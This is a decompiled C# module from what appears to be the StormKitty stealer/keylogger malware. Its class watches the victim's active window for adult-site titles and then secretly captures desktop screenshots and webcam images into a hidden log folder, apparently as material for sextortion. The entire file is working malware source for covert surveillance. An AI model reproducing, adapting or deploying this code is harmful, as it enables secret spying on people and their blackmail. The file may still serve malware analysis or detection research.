﻿using System;
using System.IO;
using System.Threading;
using Stealer;
using StormKitty;

namespace Keylogger
{
	// Token: 0x0200004F RID: 79
	internal sealed class PornDetection
	{
		// Token: 0x06000125 RID: 293 RVA: 0x00008F32 File Offset: 0x00007132
		public static void Action()
		{
			if (PornDetection.Detect())
			{
				PornDetection.SendPhotos();
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00008F40 File Offset: 0x00007140
		private static bool Detect()
		{
			foreach (string value in Config.PornServices)
			{
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00008F7C File Offset: 0x0000717C
		private static void SendPhotos()
		{
			string text = PornDetection.LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Thread.Sleep(3000);
			DesktopScreenshot.Make(text);
			Thread.Sleep(12000);
			if (PornDetection.Detect())
			{
				WebcamScreenshot.Make(text);
			}
		}

		// Token: 0x040000BD RID: 189
		private static string LogDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\nsfw\\" + DateTime.Now.ToString("yyyy-MM-dd"));
	}
}
